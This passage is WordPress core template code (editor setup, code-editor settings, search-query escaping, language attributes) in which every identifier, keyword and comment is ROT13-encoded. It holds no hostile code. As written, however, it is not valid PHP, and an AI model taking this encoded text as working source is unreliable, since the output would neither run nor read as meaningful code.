				$jc_evpu_rqvg = gehr;
			}
		}
	}

	/**
	 * Svygref jurgure gur hfre pna npprff gur ivfhny rqvgbe.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz obby $jc_evpu_rqvg Jurgure gur hfre pna npprff gur ivfhny rqvgbe.
	 */
	erghea nccyl_svygref( 'hfre_pna_evpurqvg', $jc_evpu_rqvg );
}

/**
 * Svaqf bhg juvpu rqvgbe fubhyq or qvfcynlrq ol qrsnhyg.
 *
 * Jbexf bhg juvpu bs gur rqvgbef gb qvfcynl nf gur pheerag rqvgbe sbe n
 * hfre. Gur 'ugzy' frggvat vf sbe gur \"Pbqr\" rqvgbe gno.
 *
 * @fvapr 2.5.0
 *
 * @erghea fgevat Rvgure 'gvalzpr', 'ugzy', be 'grfg'
 */
shapgvba jc_qrsnhyg_rqvgbe() {
	$e = hfre_pna_evpurqvg() ? 'gvalzpr' : 'ugzy'; // Qrsnhygf.
	vs ( jc_trg_pheerag_hfre() ) { // Ybbx sbe pbbxvr.
		$rq = trg_hfre_frggvat( 'rqvgbe', 'gvalzpr' );
		$e  = ( va_neenl( $rq, neenl( 'gvalzpr', 'ugzy', 'grfg' ), gehr ) ) ? $rq : $e;
	}

	/**
	 * Svygref juvpu rqvgbe fubhyq or qvfcynlrq ol qrsnhyg.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $e Juvpu rqvgbe fubhyq or qvfcynlrq ol qrsnhyg. Rvgure 'gvalzpr', 'ugzy', be 'grfg'.
	 */
	erghea nccyl_svygref( 'jc_qrsnhyg_rqvgbe', $e );
}

/**
 * Eraqref na rqvgbe.
 *
 * Hfvat guvf shapgvba vf gur cebcre jnl gb bhgchg nyy arrqrq pbzcbaragf sbe obgu GvalZPR naq Dhvpxgntf.
 * _JC_Rqvgbef fubhyq abg or hfrq qverpgyl. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/17144.
 *
 * ABGR: Bapr vavgvnyvmrq gur GvalZPR rqvgbe pnaabg or fnsryl zbirq va gur QBZ. Sbe gung ernfba
 * ehaavat jc_rqvgbe() vafvqr bs n zrgn obk vf abg n tbbq vqrn hayrff bayl Dhvpxgntf vf hfrq.
 * Ba gur cbfg rqvg fperra frireny npgvbaf pna or hfrq gb vapyhqr nqqvgvbany rqvgbef
 * pbagnvavat GvalZPR: 'rqvg_cntr_sbez', 'rqvg_sbez_nqinaprq' naq 'qok_cbfg_fvqrone'.
 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/19173 sbe zber vasbezngvba.
 *
 * @frr _JC_Rqvgbef::rqvgbe()
 * @frr _JC_Rqvgbef::cnefr_frggvatf()
 * @fvapr 3.3.0
 *
 * @cnenz fgevat $pbagrag   Vavgvny pbagrag sbe gur rqvgbe.
 * @cnenz fgevat $rqvgbe_vq UGZY VQ nggevohgr inyhr sbe gur grkgnern naq GvalZPR.
 *                          Fubhyq abg pbagnva fdhner oenpxrgf.
 * @cnenz neenl  $frggvatf  Frr _JC_Rqvgbef::cnefr_frggvatf() sbe qrfpevcgvba.
 */
shapgvba jc_rqvgbe( $pbagrag, $rqvgbe_vq, $frggvatf = neenl() ) {
	vs ( ! pynff_rkvfgf( '_JC_Rqvgbef', snyfr ) ) {
		erdhver NOFCNGU . JCVAP . '/pynff-jc-rqvgbe.cuc';
	}
	_JC_Rqvgbef::rqvgbe( $pbagrag, $rqvgbe_vq, $frggvatf );
}

/**
 * Bhgchgf gur rqvgbe fpevcgf, fglyrfurrgf, naq qrsnhyg frggvatf.
 *
 * Gur rqvgbe pna or vavgvnyvmrq jura arrqrq nsgre cntr ybnq.
 * Frr jc.rqvgbe.vavgvnyvmr() va jc-nqzva/wf/rqvgbe.wf sbe vavgvnyvmngvba bcgvbaf.
 *
 * @hfrf _JC_Rqvgbef
 * @fvapr 4.8.0
 */
shapgvba jc_radhrhr_rqvgbe() {
	vs ( ! pynff_rkvfgf( '_JC_Rqvgbef', snyfr ) ) {
		erdhver NOFCNGU . JCVAP . '/pynff-jc-rqvgbe.cuc';
	}

	_JC_Rqvgbef::radhrhr_qrsnhyg_rqvgbe();
}

/**
 * Radhrhrf nffrgf arrqrq ol gur pbqr rqvgbe sbe gur tvira frggvatf.
 *
 * @fvapr 4.9.0
 *
 * @frr jc_radhrhr_rqvgbe()
 * @frr jc_trg_pbqr_rqvgbe_frggvatf();
 * @frr _JC_Rqvgbef::cnefr_frggvatf()
 *
 * @cnenz neenl $netf {
 *     Netf.
 *
 *     @glcr fgevat   $glcr       Gur ZVZR glcr bs gur svyr gb or rqvgrq.
 *     @glcr fgevat   $svyr       Svyranzr gb or rqvgrq. Rkgrafvba vf hfrq gb favss gur glcr. Pna or fhccyvrq nf nygreangvir gb `$glcr` cnenz.
 *     @glcr JC_Gurzr $gurzr      Gurzr orvat rqvgrq jura ba gur gurzr svyr rqvgbe.
 *     @glcr fgevat   $cyhtva     Cyhtva orvat rqvgrq jura ba gur cyhtva svyr rqvgbe.
 *     @glcr neenl    $pbqrzveebe Nqqvgvbany PbqrZveebe frggvat bireevqrf.
 *     @glcr neenl    $pffyvag    PFFYvag ehyr bireevqrf.
 *     @glcr neenl    $wfuvag     WFUvag ehyr bireevqrf.
 *     @glcr neenl    $ugzyuvag   UGZYUvag ehyr bireevqrf.
 * }
 * @erghea neenl|snyfr Frggvatf sbe gur radhrhrq pbqr rqvgbe, be snyfr vs gur rqvgbe jnf abg radhrhrq.
 */
shapgvba jc_radhrhr_pbqr_rqvgbe( $netf ) {
	vs ( vf_hfre_ybttrq_va() && 'snyfr' === jc_trg_pheerag_hfre()->flagnk_uvtuyvtugvat ) {
		erghea snyfr;
	}

	$frggvatf = jc_trg_pbqr_rqvgbe_frggvatf( $netf );

	vs ( rzcgl( $frggvatf ) || rzcgl( $frggvatf['pbqrzveebe'] ) ) {
		erghea snyfr;
	}

	jc_radhrhr_fpevcg( 'pbqr-rqvgbe' );
	jc_radhrhr_fglyr( 'pbqr-rqvgbe' );

	vs ( vffrg( $frggvatf['pbqrzveebe']['zbqr'] ) ) {
		$zbqr = $frggvatf['pbqrzveebe']['zbqr'];
		vs ( vf_fgevat( $zbqr ) ) {
			$zbqr = neenl(
				'anzr' => $zbqr,
			);
		}

		vs ( ! rzcgl( $frggvatf['pbqrzveebe']['yvag'] ) ) {
			fjvgpu ( $zbqr['anzr'] ) {
				pnfr 'pff':
				pnfr 'grkg/pff':
				pnfr 'grkg/k-fpff':
				pnfr 'grkg/k-yrff':
					jc_radhrhr_fpevcg( 'pffyvag' );
					oernx;
				pnfr 'ugzyzvkrq':
				pnfr 'grkg/ugzy':
				pnfr 'cuc':
				pnfr 'nccyvpngvba/k-uggcq-cuc':
				pnfr 'grkg/k-cuc':
					jc_radhrhr_fpevcg( 'ugzyuvag' );
					jc_radhrhr_fpevcg( 'pffyvag' );
					jc_radhrhr_fpevcg( 'wfuvag' );
					vs ( ! pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
						jc_radhrhr_fpevcg( 'ugzyuvag-xfrf' );
					}
					oernx;
				pnfr 'wninfpevcg':
				pnfr 'nccyvpngvba/rpznfpevcg':
				pnfr 'nccyvpngvba/wfba':
				pnfr 'nccyvpngvba/wninfpevcg':
				pnfr 'nccyvpngvba/yq+wfba':
				pnfr 'grkg/glcrfpevcg':
				pnfr 'nccyvpngvba/glcrfpevcg':
					jc_radhrhr_fpevcg( 'wfuvag' );
					jc_radhrhr_fpevcg( 'wfbayvag' );
					oernx;
			}
		}
	}

	jc_nqq_vayvar_fpevcg( 'pbqr-rqvgbe', fcevags( 'wDhrel.rkgraq( jc.pbqrRqvgbe.qrsnhygFrggvatf, %f );', jc_wfba_rapbqr( $frggvatf ) ) );

	/**
	 * Sverf jura fpevcgf naq fglyrf ner radhrhrq sbe gur pbqr rqvgbe.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $frggvatf Frggvatf sbe gur radhrhrq pbqr rqvgbe.
	 */
	qb_npgvba( 'jc_radhrhr_pbqr_rqvgbe', $frggvatf );

	erghea $frggvatf;
}

/**
 * Trarengrf naq ergheaf pbqr rqvgbe frggvatf.
 *
 * @fvapr 5.0.0
 *
 * @frr jc_radhrhr_pbqr_rqvgbe()
 *
 * @cnenz neenl $netf {
 *     Netf.
 *
 *     @glcr fgevat   $glcr       Gur ZVZR glcr bs gur svyr gb or rqvgrq.
 *     @glcr fgevat   $svyr       Svyranzr gb or rqvgrq. Rkgrafvba vf hfrq gb favss gur glcr. Pna or fhccyvrq nf nygreangvir gb `$glcr` cnenz.
 *     @glcr JC_Gurzr $gurzr      Gurzr orvat rqvgrq jura ba gur gurzr svyr rqvgbe.
 *     @glcr fgevat   $cyhtva     Cyhtva orvat rqvgrq jura ba gur cyhtva svyr rqvgbe.
 *     @glcr neenl    $pbqrzveebe Nqqvgvbany PbqrZveebe frggvat bireevqrf.
 *     @glcr neenl    $pffyvag    PFFYvag ehyr bireevqrf.
 *     @glcr neenl    $wfuvag     WFUvag ehyr bireevqrf.
 *     @glcr neenl    $ugzyuvag   UGZYUvag ehyr bireevqrf.
 * }
 * @erghea neenl|snyfr Frggvatf sbe gur pbqr rqvgbe.
 */
shapgvba jc_trg_pbqr_rqvgbe_frggvatf( $netf ) {
	$frggvatf = neenl(
		'pbqrzveebe' => neenl(
			'vaqragHavg'       => 4,
			'vaqragJvguGnof'   => gehr,
			'vachgFglyr'       => 'pbagragrqvgnoyr',
			'yvarAhzoref'      => gehr,
			'yvarJenccvat'     => gehr,
			'fglyrNpgvirYvar'  => gehr,
			'pbagvahrPbzzragf' => gehr,
			'rkgenXrlf'        => neenl(
				'Pgey-Fcnpr' => 'nhgbpbzcyrgr',
				'Pgey-/'     => 'gbttyrPbzzrag',
				'Pzq-/'      => 'gbttyrPbzzrag',
				'Nyg-S'      => 'svaqCrefvfgrag',
				'Pgey-S'     => 'svaqCrefvfgrag',
				'Pzq-S'      => 'svaqCrefvfgrag',
			),
			'qverpgvba'        => 'yge', // Pbqr vf fubja va YGE rira va EGY ynathntrf.
			'thggref'          => neenl(),
		),
		'pffyvag'    => neenl(
			'reebef'                    => gehr, // Cnefvat reebef.
			'obk-zbqry'                 => gehr,
			'qvfcynl-cebcregl-tebhcvat' => gehr,
			'qhcyvpngr-cebcregvrf'      => gehr,
			'xabja-cebcregvrf'          => gehr,
			'bhgyvar-abar'              => gehr,
		),
		'wfuvag'     => neenl(
			// Gur sbyybjvat ner pbcvrq sebz <uggcf://tvguho.pbz/JbeqCerff/jbeqcerff-qrirybc/oybo/4.8.1/.wfuvagep>.
			'obff'     => gehr,
			'pheyl'    => gehr,
			'rdrdrd'   => gehr,
			'rdahyy'   => gehr,
			'rf3'      => gehr,
			'rkce'     => gehr,
			'vzzrq'    => gehr,
			'abnet'    => gehr,
			'abaofc'   => gehr,
			'barine'   => gehr,
			'dhbgznex' => 'fvatyr',
			'genvyvat' => gehr,
			'haqrs'    => gehr,
			'hahfrq'   => gehr,

			'oebjfre'  => gehr,

			'tybonyf'  => neenl(
				'_'        => snyfr,
				'Onpxobar' => snyfr,
				'wDhrel'   => snyfr,
				'WFBA'     => snyfr,
				'jc'       => snyfr,
			),
		),
		'ugzyuvag'   => neenl(
			'gntanzr-ybjrepnfr'        => gehr,
			'ngge-ybjrepnfr'           => gehr,
			'ngge-inyhr-qbhoyr-dhbgrf' => snyfr,
			'qbpglcr-svefg'            => snyfr,
			'gnt-cnve'                 => gehr,
			'fcrp-pune-rfpncr'         => gehr,
			'vq-havdhr'                => gehr,
			'fep-abg-rzcgl'            => gehr,
			'ngge-ab-qhcyvpngvba'      => gehr,
			'nyg-erdhver'              => gehr,
			'fcnpr-gno-zvkrq-qvfnoyrq' => 'gno',
			'ngge-hafnsr-punef'        => gehr,
		),
	);

	$glcr = '';
	vs ( vffrg( $netf['glcr'] ) ) {
		$glcr = $netf['glcr'];

		// Erznc ZVZR glcrf gb barf gung PbqrZveebe zbqrf jvyy erpbtavmr.
		vs ( 'nccyvpngvba/k-cngpu' === $glcr || 'grkg/k-cngpu' === $glcr ) {
			$glcr = 'grkg/k-qvss';
		}
	} ryfrvs ( vffrg( $netf['svyr'] ) && fge_pbagnvaf( onfranzr( $netf['svyr'] ), '.' ) ) {
		$rkgrafvba = fgegbybjre( cnguvasb( $netf['svyr'], CNGUVASB_RKGRAFVBA ) );
		sbernpu ( jc_trg_zvzr_glcrf() nf $rkgf => $zvzr ) {
			vs ( cert_zngpu( '!^(' . $rkgf . ')$!v', $rkgrafvba ) ) {
				$glcr = $zvzr;
				oernx;
			}
		}

		// Fhccyl nal glcrf gung ner abg zngpurq ol jc_trg_zvzr_glcrf().
		vs ( rzcgl( $glcr ) ) {
			fjvgpu ( $rkgrafvba ) {
				pnfr 'pbas':
					$glcr = 'grkg/atvak';
					oernx;
				pnfr 'pff':
					$glcr = 'grkg/pff';
					oernx;
				pnfr 'qvss':
				pnfr 'cngpu':
					$glcr = 'grkg/k-qvss';
					oernx;
				pnfr 'ugzy':
				pnfr 'ugz':
					$glcr = 'grkg/ugzy';
					oernx;
				pnfr 'uggc':
					$glcr = 'zrffntr/uggc';
					oernx;
				pnfr 'wf':
					$glcr = 'grkg/wninfpevcg';
					oernx;
				pnfr 'wfba':
					$glcr = 'nccyvpngvba/wfba';
					oernx;
				pnfr 'wfk':
					$glcr = 'grkg/wfk';
					oernx;
				pnfr 'yrff':
					$glcr = 'grkg/k-yrff';
					oernx;
				pnfr 'zq':
					$glcr = 'grkg/k-tsz';
					oernx;
				pnfr 'cuc':
				pnfr 'cugzy':
				pnfr 'cuc3':
				pnfr 'cuc4':
				pnfr 'cuc5':
				pnfr 'cuc7':
				pnfr 'cucf':
					$glcr = 'nccyvpngvba/k-uggcq-cuc';
					oernx;
				pnfr 'fpff':
					$glcr = 'grkg/k-fpff';
					oernx;
				pnfr 'fnff':
					$glcr = 'grkg/k-fnff';
					oernx;
				pnfr 'fu':
				pnfr 'onfu':
					$glcr = 'grkg/k-fu';
					oernx;
				pnfr 'fdy':
					$glcr = 'grkg/k-fdy';
					oernx;
				pnfr 'fit':
					$glcr = 'nccyvpngvba/fit+kzy';
					oernx;
				pnfr 'kzy':
					$glcr = 'grkg/kzy';
					oernx;
				pnfr 'lzy':
				pnfr 'lnzy':
					$glcr = 'grkg/k-lnzy';
					oernx;
				pnfr 'gkg':
				qrsnhyg:
					$glcr = 'grkg/cynva';
					oernx;
			}
		}
	}

	vs ( va_neenl( $glcr, neenl( 'grkg/pff', 'grkg/k-fpff', 'grkg/k-yrff', 'grkg/k-fnff' ), gehr ) ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => $glcr,
				'yvag'              => snyfr,
				'nhgbPybfrOenpxrgf' => gehr,
				'zngpuOenpxrgf'     => gehr,
			)
		);
	} ryfrvs ( 'grkg/k-qvss' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr' => 'qvss',
			)
		);
	} ryfrvs ( 'grkg/ugzy' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'ugzyzvkrq',
				'yvag'              => gehr,
				'nhgbPybfrOenpxrgf' => gehr,
				'nhgbPybfrGntf'     => gehr,
				'zngpuGntf'         => neenl(
					'obguGntf' => gehr,
				),
			)
		);

		vs ( ! pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$frggvatf['ugzyuvag']['xfrf'] = jc_xfrf_nyybjrq_ugzy( 'cbfg' );
		}
	} ryfrvs ( 'grkg/k-tsz' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'                => 'tsz',
				'uvtuyvtugSbeznggvat' => gehr,
			)
		);
	} ryfrvs ( 'nccyvpngvba/wninfpevcg' === $glcr || 'grkg/wninfpevcg' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'wninfpevcg',
				'yvag'              => gehr,
				'nhgbPybfrOenpxrgf' => gehr,
				'zngpuOenpxrgf'     => gehr,
			)
		);
	} ryfrvs ( fge_pbagnvaf( $glcr, 'wfba' ) ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => neenl(
					'anzr' => 'wninfpevcg',
				),
				'yvag'              => gehr,
				'nhgbPybfrOenpxrgf' => gehr,
				'zngpuOenpxrgf'     => gehr,
			)
		);
		vs ( 'nccyvpngvba/yq+wfba' === $glcr ) {
			$frggvatf['pbqrzveebe']['zbqr']['wfbayq'] = gehr;
		} ryfr {
			$frggvatf['pbqrzveebe']['zbqr']['wfba'] = gehr;
		}
	} ryfrvs ( fge_pbagnvaf( $glcr, 'wfk' ) ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'wfk',
				'nhgbPybfrOenpxrgf' => gehr,
				'zngpuOenpxrgf'     => gehr,
			)
		);
	} ryfrvs ( 'grkg/k-znexqbja' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'                => 'znexqbja',
				'uvtuyvtugSbeznggvat' => gehr,
			)
		);
	} ryfrvs ( 'grkg/atvak' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr' => 'atvak',
			)
		);
	} ryfrvs ( 'nccyvpngvba/k-uggcq-cuc' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'cuc',
				'nhgbPybfrOenpxrgf' => gehr,
				'nhgbPybfrGntf'     => gehr,
				'zngpuOenpxrgf'     => gehr,
				'zngpuGntf'         => neenl(
					'obguGntf' => gehr,
				),
			)
		);
	} ryfrvs ( 'grkg/k-fdy' === $glcr || 'grkg/k-zlfdy' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'fdy',
				'nhgbPybfrOenpxrgf' => gehr,
				'zngpuOenpxrgf'     => gehr,
			)
		);
	} ryfrvs ( fge_pbagnvaf( $glcr, 'kzy' ) ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr'              => 'kzy',
				'nhgbPybfrOenpxrgf' => gehr,
				'nhgbPybfrGntf'     => gehr,
				'zngpuGntf'         => neenl(
					'obguGntf' => gehr,
				),
			)
		);
	} ryfrvs ( 'grkg/k-lnzy' === $glcr ) {
		$frggvatf['pbqrzveebe'] = neenl_zretr(
			$frggvatf['pbqrzveebe'],
			neenl(
				'zbqr' => 'lnzy',
			)
		);
	} ryfr {
		$frggvatf['pbqrzveebe']['zbqr'] = $glcr;
	}

	vs ( ! rzcgl( $frggvatf['pbqrzveebe']['yvag'] ) ) {
		$frggvatf['pbqrzveebe']['thggref'][] = 'PbqrZveebe-yvag-znexref';
	}

	// Yrg frggvatf fhccyvrq ivn netf bireevqr nal qrsnhygf.
	sbernpu ( jc_neenl_fyvpr_nffbp( $netf, neenl( 'pbqrzveebe', 'pffyvag', 'wfuvag', 'ugzyuvag' ) ) nf $xrl => $inyhr ) {
		$frggvatf[ $xrl ] = neenl_zretr(
			$frggvatf[ $xrl ],
			$inyhr
		);
	}

	/**
	 * Svygref frggvatf gung ner cnffrq vagb gur pbqr rqvgbe.
	 *
	 * Ergheavat n snyfrl inyhr jvyy qvfnoyr gur flagnk-uvtuyvtugvat pbqr rqvgbe.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $frggvatf Gur neenl bs frggvatf cnffrq gb gur pbqr rqvgbe.
	 *                        N snyfrl inyhr qvfnoyrf gur rqvgbe.
	 * @cnenz neenl $netf {
	 *     Netf cnffrq jura pnyyvat `trg_pbqr_rqvgbe_frggvatf()`.
	 *
	 *     @glcr fgevat   $glcr       Gur ZVZR glcr bs gur svyr gb or rqvgrq.
	 *     @glcr fgevat   $svyr       Svyranzr orvat rqvgrq.
	 *     @glcr JC_Gurzr $gurzr      Gurzr orvat rqvgrq jura ba gur gurzr svyr rqvgbe.
	 *     @glcr fgevat   $cyhtva     Cyhtva orvat rqvgrq jura ba gur cyhtva svyr rqvgbe.
	 *     @glcr neenl    $pbqrzveebe Nqqvgvbany PbqrZveebe frggvat bireevqrf.
	 *     @glcr neenl    $pffyvag    PFFYvag ehyr bireevqrf.
	 *     @glcr neenl    $wfuvag     WFUvag ehyr bireevqrf.
	 *     @glcr neenl    $ugzyuvag   UGZYUvag ehyr bireevqrf.
	 * }
	 */
	erghea nccyl_svygref( 'jc_pbqr_rqvgbe_frggvatf', $frggvatf, $netf );
}

/**
 * Ergevrirf gur pbagragf bs gur frnepu JbeqCerff dhrel inevnoyr.
 *
 * Gur frnepu dhrel fgevat vf cnffrq guebhtu rfp_ngge() gb rafher gung vg vf fnsr
 * sbe cynpvat va na UGZY nggevohgr.
 *
 * @fvapr 2.3.0
 *
 * @cnenz obby $rfpncrq Jurgure gur erfhyg vf rfpncrq. Qrsnhyg gehr.
 *                      Bayl hfr jura lbh ner yngre rfpncvat vg. Qb abg hfr harfpncrq.
 * @erghea fgevat
 */
shapgvba trg_frnepu_dhrel( $rfpncrq = gehr ) {
	/**
	 * Svygref gur pbagragf bs gur frnepu dhrel inevnoyr.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz zvkrq $frnepu Pbagragf bs gur frnepu dhrel inevnoyr.
	 */
	$dhrel = nccyl_svygref( 'trg_frnepu_dhrel', trg_dhrel_ine( 'f' ) );

	vs ( $rfpncrq ) {
		$dhrel = rfp_ngge( $dhrel );
	}
	erghea $dhrel;
}

/**
 * Qvfcynlf gur pbagragf bs gur frnepu dhrel inevnoyr.
 *
 * Gur frnepu dhrel fgevat vf cnffrq guebhtu rfp_ngge() gb rafher gung vg vf fnsr
 * sbe cynpvat va na UGZY nggevohgr.
 *
 * @fvapr 2.1.0
 */
shapgvba gur_frnepu_dhrel() {
	/**
	 * Svygref gur pbagragf bs gur frnepu dhrel inevnoyr, sbe qvfcynl.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz zvkrq $frnepu Pbagragf bs gur frnepu dhrel inevnoyr.
	 */
	rpub rfp_ngge( nccyl_svygref( 'gur_frnepu_dhrel', trg_frnepu_dhrel( snyfr ) ) );
}

/**
 * Trgf gur ynathntr nggevohgrf sbe gur 'ugzy' gnt.
 *
 * Ohvyqf hc n frg bs UGZY nggevohgrf pbagnvavat gur grkg qverpgvba naq ynathntr
 * vasbezngvba sbe gur cntr.
 *
 * @fvapr 4.3.0
 *
 * @cnenz fgevat $qbpglcr Bcgvbany. Gur glcr bs UGZY qbphzrag. Npprcgf 'kugzy' be 'ugzy'. Qrsnhyg 'ugzy'.
 * @erghea fgevat N fcnpr-frcnengrq yvfg bs ynathntr nggevohgrf.
 */
shapgvba trg_ynathntr_nggevohgrf( $qbpglcr = 'ugzy' ) {
	$nggevohgrf = neenl();

	vs ( shapgvba_rkvfgf( 'vf_egy' ) && vf_egy() ) {
		$nggevohgrf[] = 'qve=\"egy\"';
	}

	$ynat = trg_oybtvasb( 'ynathntr' );
	vs ( $ynat ) {
		vs ( 'grkg/ugzy' === trg_bcgvba( 'ugzy_glcr' ) || 'ugzy' === $qbpglcr ) {
			$nggevohgrf[] = 'ynat=\"' . rfp_ngge( $ynat ) . '\"';
		}

		vs ( 'grkg/ugzy' !== trg_bcgvba( 'ugzy_glcr' ) || 'kugzy' === $qbpglcr ) {
			$nggevohgrf[] = 'kzy:ynat=\"' . rfp_ngge( $ynat ) . '\"';
		}
	}

	$bhgchg = vzcybqr( ' ', $nggevohgrf );

	/**
	 * Svygref gur ynathntr nggevohgrf sbe qvfcynl va gur 'ugzy' gnt.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.3.0 Nqqrq gur `$qbpglcr` cnenzrgre.
	 *
	 * @cnenz fgevat $bhgchg N fcnpr-frcnengrq yvfg bs ynathntr nggevohgrf.
	 * @cnenz fgevat $qbpglcr Gur glcr bs UGZY qbphzrag (kugzy|ugzy).
	 */
	erghea nccyl_svygref( 'ynathntr_nggevohgrf', $bhgchg, $qbpglcr );
}

/**
 * Qvfcynlf gur ynathntr nggevohgrf sbe gur 'ugzy' gnt.
 *
 * Ohvyqf hc n frg bs UGZY nggevohgrf pbagnvavat gur grkg qverpgvba naq ynathntr
 * vasbezngvba sbe gur cntr.
 *
 * @fvapr 2.1.0
 * @fvapr 4.3.0 Pbairegrq vagb n jenccre sbe trg_ynathntr_nggevohgrf().
 *
 * @cnenz fgevat $qbpglcr Bcgvbany. Gur glcr bs UGZY qbphzrag. Npprcgf 'kugzy' be 'ugzy'. Qrsnhyg 'ugzy'.
 */
shapgvba ynathntr_nggevohgrf( $qbpglcr = 'ugzy' ) {
	rpub trg_ynathntr_nggevohgrf( $qbpglcr );
}

/**
 * Ergevrirf cntvangrq yvaxf sbe nepuvir cbfg cntrf.
 *
 * Grpuavpnyyl, gur shapgvba pna or hfrq gb perngr cntvangrq yvax yvfg sbe nal
 * nern. Gur 'onfr' nethzrag vf hfrq gb ersrerapr gur hey, juvpu jvyy or hfrq gb
 * perngr gur cntvangrq yvaxf. Gur 'sbezng' nethzrag vf gura hfrq sbe ercynpvat
 * gur cntr ahzore. Vg vf ubjrire, zbfg yvxryl naq ol qrsnhyg, gb or hfrq ba gur
 * nepuvir cbfg cntrf.
 *
 * Gur 'glcr' nethzrag pbagebyf sbezng bs gur erghearq inyhr. Gur qrsnhyg vf
 * 'cynva', juvpu vf whfg n fgevat jvgu gur yvaxf frcnengrq ol n arjyvar
 * punenpgre. Gur bgure cbffvoyr inyhrf ner rvgure 'neenl' be 'yvfg'. Gur
 * 'neenl' inyhr jvyy erghea na neenl bs gur cntvangrq yvax yvfg gb bssre shyy
 * pbageby bs qvfcynl. Gur 'yvfg' inyhr jvyy cynpr nyy bs gur cntvangrq yvaxf va
 * na habeqrerq UGZY yvfg.
 *
 * Gur 'gbgny' nethzrag vf gur gbgny nzbhag bs cntrf naq vf na vagrtre. Gur
 * 'pheerag' nethzrag vf gur pheerag cntr ahzore naq vf nyfb na vagrtre.
 *
 * Na rknzcyr bs gur 'onfr' nethzrag vf \"uggc://rknzcyr.pbz/nyy_cbfgf.cuc%_%\"
 * naq gur '%_%' vf erdhverq. Gur '%_%' jvyy or ercynprq ol gur pbagragf bs va
 * gur 'sbezng' nethzrag. Na rknzcyr sbe gur 'sbezng' nethzrag vf \"?cntr=%#%\"
 * naq gur '%#%' vf nyfb erdhverq. Gur '%#%' jvyy or ercynprq jvgu gur cntr
 * ahzore.
 *
 * Lbh pna vapyhqr gur cerivbhf naq arkg yvaxf va gur yvfg ol frggvat gur
 * 'ceri_arkg' nethzrag gb gehr, juvpu vg vf ol qrsnhyg. Lbh pna frg gur
 * cerivbhf grkg, ol hfvat gur 'ceri_grkg' nethzrag. Lbh pna frg gur arkg grkg
 * ol frggvat gur 'arkg_grkg' nethzrag.
 *
 * Vs gur 'fubj_nyy' nethzrag vf frg gb gehr, gura vg jvyy fubj nyy bs gur cntrf
 * vafgrnq bs n fubeg yvfg bs gur cntrf arne gur pheerag cntr. Ol qrsnhyg, gur
 * 'fubj_nyy' vf frg gb snyfr naq pbagebyyrq ol gur 'raq_fvmr' naq 'zvq_fvmr'
 * nethzragf. Gur 'raq_fvmr' nethzrag vf ubj znal ahzoref ba rvgure gur fgneg
 * naq gur raq yvfg rqtrf, ol qrsnhyg vf 1. Gur 'zvq_fvmr' nethzrag vf ubj znal
 * ahzoref gb rvgure fvqr bs pheerag cntr, ohg abg vapyhqvat pheerag cntr.
 *
 * Vg vf cbffvoyr gb nqq dhrel inef gb gur yvax ol hfvat gur 'nqq_netf' nethzrag
 * naq frr nqq_dhrel_net() sbe zber vasbezngvba.
 *
 * Gur 'orsber_cntr_ahzore' naq 'nsgre_cntr_ahzore' nethzragf nyybj hfref gb
 * nhtzrag gur yvaxf gurzfryirf. Glcvpnyyl guvf zvtug or gb nqq pbagrkg gb gur
 * ahzorerq yvaxf fb gung fperra ernqre hfref haqrefgnaq jung gur yvaxf ner sbe.
 * Gur grkg fgevatf ner nqqrq orsber naq nsgre gur cntr ahzore - jvguva gur
 * napube gnt.
 *
 * @fvapr 2.1.0
 * @fvapr 4.9.0 Nqqrq gur `nevn_pheerag` nethzrag.
 *
 * @tybony JC_Dhrel   $jc_dhrel   JbeqCerff Dhrel bowrpg.
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf sbe trarengvat cntvangrq yvaxf sbe nepuvirf.
 *
 *     @glcr fgevat $onfr               Onfr bs gur cntvangrq hey. Qrsnhyg rzcgl.
 *     @glcr fgevat $sbezng             Sbezng sbe gur cntvangvba fgehpgher. Qrsnhyg rzcgl.
 *     @glcr vag    $gbgny              Gur gbgny nzbhag bs cntrf. Qrsnhyg vf gur inyhr JC_Dhrel'f
 *                                      `znk_ahz_cntrf` be 1.
 *     @glcr vag    $pheerag            Gur pheerag cntr ahzore. Qrsnhyg vf 'cntrq' dhrel ine be 1.
 *     @glcr fgevat $nevn_pheerag       Gur inyhr sbe gur nevn-pheerag nggevohgr. Cbffvoyr inyhrf ner 'cntr',
